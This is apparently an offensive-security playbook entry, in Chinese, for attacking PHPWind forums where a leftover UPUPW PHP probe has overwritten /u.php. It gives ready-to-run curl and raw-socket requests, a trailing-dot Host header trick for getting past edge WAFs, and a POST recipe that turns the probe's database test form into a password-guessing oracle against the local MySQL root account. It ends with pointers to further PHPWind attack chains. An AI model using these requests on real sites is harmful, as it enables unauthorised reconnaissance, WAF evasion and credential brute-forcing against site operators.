# UPUPW PHP探针安全版 覆盖 PHPWind /u.php —— 零凭证环境信息泄露 + 本机 MySQL 口令 oracle

## 指纹 / 判据（一眼认）
- `<title>UPUPW PHP探针安全版</title>`，整页约 9.7KB
- 正文固定字段：`服务器域名` / `服务器环境` / `PHP运行环境` / `Memory限制` / `Upload限制` / `POST限制` / `Execution超时` / `已编译模块`
- 含 `<form method="post" action="/u.php">` 的「数据库连接测试」，字段 `mysqlHost`（硬编码默认 `127.0.0.1`）/`mysqlPort`/`mysqlUser`/`mysqlPass`
- 强判据（证明是"文件被覆盖"而非正常页面）：同路径 PHPWind 原功能（个人中心、`?action=uploadicon` 头像上传）全部失效，任何 `action` 参数都返回同一份探针页、同长度、同 title。

## 前置条件
- 目标为 PHPWind（常见 7.x）论坛，运维遗留探针被放在 Web 根下，且路径恰好与原程序文件重名（本条为 `/u.php`）
- 不需要任何账号 / Cookie / Referer
- 部分边缘 WAF 对精确 Host 直接 RST：改用 FQDN 尾点写法 `Host: target.domain.`（实测可绕过）；仍不行则直连源站 IP + 尾点 Host

## 复现请求

### 1) 最小验证（curl）
```bash
curl -sS --noproxy '*' -D - \
  -H 'Host: TARGET_DOMAIN.' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
  "http://TARGET_IP:898/u.php"
```
期望：`HTTP/1.1 200 OK` + `Content-Type: text/html; charset=utf-8` + `Set-Cookie: PHPSESSID=...`，body 命中上面的指纹字段。

### 2) 原始 socket（curl / 代理链被 502 干扰时用）
```python
import socket

req = ("GET /u.php HTTP/1.1\r\n"
       "Host: TARGET_DOMAIN.\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0\r\n"
       "Connection: close\r\n\r\n")

s = socket.create_connection(("TARGET_IP", 898), timeout=10)
s.sendall(req.encode())
buf = b""
while True:
    d = s.recv(65536)
    if not d:
        break
    buf += d

print(buf[:300].decode("latin-1"))
print("UPUPW 命中:", b"UPUPW" in buf, "| 探针标题命中:", "PHP探针安全版".encode() in buf)
```

### 3) 覆盖面确认（action 参数不影响输出）
```
GET /u.php?action=uploadicon HTTP/1.1
Host: TARGET_DOMAIN.
Connection: close
```
期望：与 `/u.php` 完全一致（同长度、同 title），不含 PHPWind 头像上传表单。

## 判据
- 200 + `UPUPW PHP探针安全版` + 上述参数行 ⇒ 成立
- 泄露内容：主机名、nginx 版本、PHP 版本与 SAPI（fpm-fcgi）、内存/上传/POST/超时限制、已编译扩展清单（pdo_mysql、sockets、zip、mcrypt、Phar、Zend Guard Loader 等）
- 同目录可顺手试 `p.php / php.php / i.php / phpinfo.php / tz.php`，同类探针常成组遗留

## 失败时的常见原因
| 现象 | 原因 | 处置 |
|---|---|---|
| 连接被 RST / 空响应 | 边缘 WAF 对精确 Host 拦截 | Host 改 `target.domain.`（尾点），或直连 IP + 尾点 Host |
| 502 / 空体 | 本机记录的 HTTP 代理劫持了请求 | 加 `--noproxy '*'`；Python 用 `trust_env=False` 或 raw socket |
| 404 / 跳 PHPWind 登录 | 探针不在该路径 | 换常见探针名；本条不成立 |
| 200 但标题是 PHPWind 用户中心 | 未被覆盖，只是正常页面 | 本条不成立 |

## 延伸利用：本机 MySQL 口令 oracle（表单存在性已确认，口径判读未实测）
探针内置数据库连接测试，主机字段固定 `127.0.0.1`：
```
POST /u.php HTTP/1.1
Host: TARGET_DOMAIN.
Content-Type: application/x-www-form-urlencoded
Content-Length: N
Connection: close

mysqlHost=127.0.0.1&mysqlPort=3306&mysqlUser=root&mysqlPass=GUESS
```
按返回文案/错误码区分三种状态：
- 连接被拒（2003 类）⇒ 3306 未监听
- 访问被拒（1045 类）⇒ 服务在跑，用户/口令错
- 「连接成功」/返回库列表 ⇒ 命中，可继续当本机 DB 的在线口令 oracle

注意：这是对目标**本机**数据库的口令探测，必须逐次低频；本条只实测了表单存在且 POST 输出可达，三态口径需现场各取一次样本再判定。

## 影响
- 非预期暴露主机名、中间件与 PHP 精确版本、运行参数与扩展清单 → 直接支撑 Nday 选型（如 PHP 5.3 老版本、FPM 相关 CVE）
- 对外提供本机 3306 凭据测试入口
- 该路径上的业务功能（用户中心 / 头像上传）被破坏，同时说明部署面存在运维遗留文件

## 关联打法
- 拿 PHPWind 精确版本与表前缀：知识库 `phpwind-站点精确版本与数据库表前缀的无认证识别`
- 探针若进一步暴露绝对路径/配置，可接 PHPWind 写 PHP sink 路线：知识库 `phpwind-写-php-文件-sink-的三面叠加扫描法-数据来源分类-变量路径补扫`
